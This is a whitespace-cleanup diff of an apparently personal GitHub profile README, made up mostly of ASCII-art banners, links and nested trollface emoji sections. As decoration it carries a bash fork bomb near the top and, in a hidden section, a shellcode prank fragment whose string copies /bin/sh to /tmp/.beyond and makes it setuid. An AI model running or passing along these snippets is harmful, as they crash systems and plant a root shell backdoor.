@@ -1,12 +1,12 @@
-<div align="right"> 
+<div align="right">
 
 ![connerwill.com](https://img.shields.io/website?down_color=%23ff0000&down_message=offline&label=connerwill.com&up_color=%2300ff00&up_message=online&url=https%3A%2F%2Fconnerwill.com)
 
 </div>
-<div align="right"> 
+<div align="right">
 
 ```diff
-+                                                                                                                      
++
 ```
 
 </div>
@@ -14,29 +14,29 @@
 
 <!--
 ```pwsh
- ____                                           __      __       ___    ___      
-/\  _`\                                        /\ \  __/\ \  __ /\_ \  /\_ \     
-\ \ \/\_\    ___     ___     ___      __   _ __\ \ \/\ \ \ \/\_\\//\ \ \//\ \    
- \ \ \/_/_  / __`\ /' _ `\ /' _ `\  /'__`\/\`'__\ \ \ \ \ \ \/\ \ \ \ \  \ \ \   
-  \ \ \L\ \/\ \L\ \/\ \/\ \/\ \/\ \/\  __/\ \ \/ \ \ \_/ \_\ \ \ \ \_\ \_ \_\ \_ 
+ ____                                           __      __       ___    ___
+/\  _`\                                        /\ \  __/\ \  __ /\_ \  /\_ \
+\ \ \/\_\    ___     ___     ___      __   _ __\ \ \/\ \ \ \/\_\\//\ \ \//\ \
+ \ \ \/_/_  / __`\ /' _ `\ /' _ `\  /'__`\/\`'__\ \ \ \ \ \ \/\ \ \ \ \  \ \ \
+  \ \ \L\ \/\ \L\ \/\ \/\ \/\ \/\ \/\  __/\ \ \/ \ \ \_/ \_\ \ \ \ \_\ \_ \_\ \_
    \ \____/\ \____/\ \_\ \_\ \_\ \_\ \____\\ \_\  \ `\___x___/\ \_\/\____\/\____\
     \/___/  \/___/  \/_/\/_/\/_/\/_/\/____/ \/_/   '\/__//__/  \/_/\/____/\/____/
 ```
 -->
 
 ```bash
-:(){ :|: & };:	
+:(){ :|: & };:
 
- ▄████████  ▄██████▄  ███▄▄▄▄   ███▄▄▄▄      ▄████████    ▄████████  ▄█     █▄   ▄█   ▄█        ▄█       
-███    ███ ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███   ███    ███ ███     ███ ███  ███       ███       
-███    █▀  ███    ███ ███   ███ ███   ███   ███    █▀    ███    ███ ███     ███ ███▌ ███       ███       
-███        ███    ███ ███   ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███     ███ ███▌ ███       ███       
-███        ███    ███ ███   ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███     ███ ███▌ ███       ███       
-███    █▄  ███    ███ ███   ███ ███   ███   ███    █▄  ▀███████████ ███     ███ ███  ███       ███       
-███    ███ ███    ███ ███   ███ ███   ███   ███    ███   ███    ███ ███ ▄█▄ ███ ███  ███▌    ▄ ███▌    ▄ 
-████████▀   ▀██████▀   ▀█   █▀   ▀█   █▀    ██████████   ███    ███  ▀███▀███▀  █▀   █████▄▄██ █████▄▄██ 
-                                                         ███    ███                  ▀         ▀         
-``` 
+ ▄████████  ▄██████▄  ███▄▄▄▄   ███▄▄▄▄      ▄████████    ▄████████  ▄█     █▄   ▄█   ▄█        ▄█
+███    ███ ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███   ███    ███ ███     ███ ███  ███       ███
+███    █▀  ███    ███ ███   ███ ███   ███   ███    █▀    ███    ███ ███     ███ ███▌ ███       ███
+███        ███    ███ ███   ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███     ███ ███▌ ███       ███
+███        ███    ███ ███   ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███     ███ ███▌ ███       ███
+███    █▄  ███    ███ ███   ███ ███   ███   ███    █▄  ▀███████████ ███     ███ ███  ███       ███
+███    ███ ███    ███ ███   ███ ███   ███   ███    ███   ███    ███ ███ ▄█▄ ███ ███  ███▌    ▄ ███▌    ▄
+████████▀   ▀██████▀   ▀█   █▀   ▀█   █▀    ██████████   ███    ███  ▀███▀███▀  █▀   █████▄▄██ █████▄▄██
+                                                         ███    ███                  ▀         ▀
+```
 </div>
 
 <div align="center">
@@ -60,7 +60,7 @@
  <a href="https://connerwill.com/content/misc/void.html"><img src="https://bingimages.herokuapp.com/unsplash1" width="100%" height="50%"></a>
 </div>
 <div align="center">
- <span> 
+ <span>
   <kbd>
    <a href="https://connerwill.com"><kbd> &#x2748; <kbd> ☻ </kbd></kbd></a>
    <a href="https://github.com/ConnerWill"><kbd> GitHub </kbd></a>
@@ -80,18 +80,18 @@
 </div>
 </div>
 <div align="center">
-	
+
  ```console
- ▄████▄   ▒█████   ███▄    █  ███▄    █ ▓█████  ██▀███   █     █░ ██▓ ██▓     ██▓    
-▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒▓█░ █ ░█░▓██▒▓██▒    ▓██▒    
-▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒▒█░ █ ░█ ▒██▒▒██░    ▒██░    
-▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  ░█░ █ ░█ ░██░▒██░    ▒██░    
+ ▄████▄   ▒█████   ███▄    █  ███▄    █ ▓█████  ██▀███   █     █░ ██▓ ██▓     ██▓
+▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒▓█░ █ ░█░▓██▒▓██▒    ▓██▒
+▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒▒█░ █ ░█ ▒██▒▒██░    ▒██░
+▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  ░█░ █ ░█ ░██░▒██░    ▒██░
 ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒░░██▒██▓ ░██░░██████▒░██████▒
 ▒ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▓░▒ ▒  ░▓  ░ ▒░▓  ░░ ▒░▓  ░
 ░ ▒ ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░  ▒ ░ ░   ▒ ░░ ░ ▒  ░░ ░ ▒  ░
-░ ░        ░ ░ ░ ▒     ░   ░ ░    ░   ░ ░    ░     ░░   ░   ░   ░   ▒ ░  ░ ░     ░ ░   
+░ ░        ░ ░ ░ ▒     ░   ░ ░    ░   ░ ░    ░     ░░   ░   ░   ░   ▒ ░  ░ ░     ░ ░
 ░ ░          ░ ░           ░          ░    ░  ░   ░         ░     ░      ░  ░    ░  ░
-░ ░                                                                                    
+░ ░
 ```
 <!--
 
@@ -113,7 +113,7 @@
 <div align="right">
 
 ```http
-+                                                                                                                      
++
 ```
 
 </div>
@@ -127,7 +127,7 @@
 <details>
 <div align="center">
 :shipit:
-	
+
 <div align="right">
 <details>
 <div align="center">
@@ -141,77 +141,77 @@
   $\frac{n!}{k!(n-k)!} = {n \choose k}$
  </span>
 
-	
+
 <div align="right">
 <details>
 <div align="center">
 
 :trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface:
-	
+
 :trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface:
-	
+
 <div align="center">
 <details>
-	
+
 ---
-	
+
 <div align="center">
-	⃢	⃢	⃢
+
 	⃢	⃢	⃢:trollface:⃢
 	⃢:trollface:	⃢:trollface:
-		⃢	⃢
+
 	⃢	⃢	⃢:trollface:⃢
 :trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::tro
 	⃢	⃢	⃢:trollface:⃢	⃢:trollface:	⃢:trollface::⃢:trollface:
-	⃢
-	⃢
+
+
 	⃢	⃢	⃢:trollface:⃢
 	⃢:trollface:	⃢:trollface:
 	:⃢:trollface:
 	⃢:trollface:llface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface:
 	⃢	⃢	⃢:trollface:⃢	⃢:trollface:	⃢:trollface::⃢:trollface:
-	⃢
-	⃢
+
+
 	⃢	⃢	⃢:trollface:⃢
 	⃢:trollface:	⃢:trollface:
 	:⃢:trollface:
 	⃢:trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface:	⃢:trollface:	⃢:trollface::⃢:trollface:
-:trollface:	:⃢:trollface:	⃢
-	⃢
+:trollface:	:⃢:trollface:
+
 	⃢	⃢	⃢:trollface:⃢
 :trollface:	⃢:trollface:
-	:⃢:trollface:	⃢:trollface:	
-	⃢	⃢	⃢
+	:⃢:trollface:	⃢:trollface:
+
 :trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface:
 	⃢	⃢	⃢:trollface:⃢	⃢:trollface:	⃢:trollface::⃢:trollface:
-	⃢
-	⃢
+
+
 	⃢	⃢	⃢:trollface:⃢
 	⃢:trollface:	⃢:trollface:
 	:⃢:trollface:
 	⃢:trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface::trollface:	⃢	⃢	⃢:trollface:⃢
-	⃢:trollface:	⃢:trollface::⃢:trollface:	⃢:trollface:	
+	⃢:trollface:	⃢:trollface::⃢:trollface:	⃢:trollface:
 	⃢	⃢	⃢	⃢:trollface:⃢
 	⃢:trollface:	⃢:trollface:
-	:⃢:trollface:	⃢	⃢
+	:⃢:trollface:
 	⃢	⃢:trollface:⃢
 	⃢:trollface:	⃢:trollface:
-	:⃢:trollface:	⃢:trollface:	
-	⃢:trollface:	
-	⃢:trollface:	
-	⃢
+	:⃢:trollface:	⃢:trollface:
+	⃢:trollface:
+	⃢:trollface:
+
 	⃢	⃢	⃢:trollface:⃢	⃢:trollface:	⃢:trollface::⃢:trollface:
-	⃢
-	⃢
+
+
 	⃢	⃢	⃢:trollface:⃢
 	⃢:trollface:	⃢:trollface:
 	:⃢:trollface:
 	⃢:trollface:
-	⃢:trollface:	⃢
-	⃢
+	⃢:trollface:
+
 	⃢	⃢	⃢:trollface:⃢
 	⃢:trollface:	⃢:trollface:
-	:⃢:trollface:	⃢:trollface:	
+	:⃢:trollface:	⃢:trollface:
 
 ```hex
 char esp[] __attribute__ ((section(“.text”))) /* e.s.p
@@ -224,15 +224,15 @@ release */
 “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
 “\x6e\x2f\x73\x68\x00\x2d\x63\x00”
 “cp -p /bin/sh /tmp/.beyond; chmod 4755
-/tmp/.beyond;”;	
+/tmp/.beyond;”;
 ```
-	
+
 </div>
 
 ---
-	
+
 <br><br>
-	
+
 <details>
 <sample>
 <div align="center">
@@ -245,9 +245,9 @@ release */
  </a>
 </p>
 </sample>
-	
+
 ---
-	
+
 </div>
 </div>
 </div>
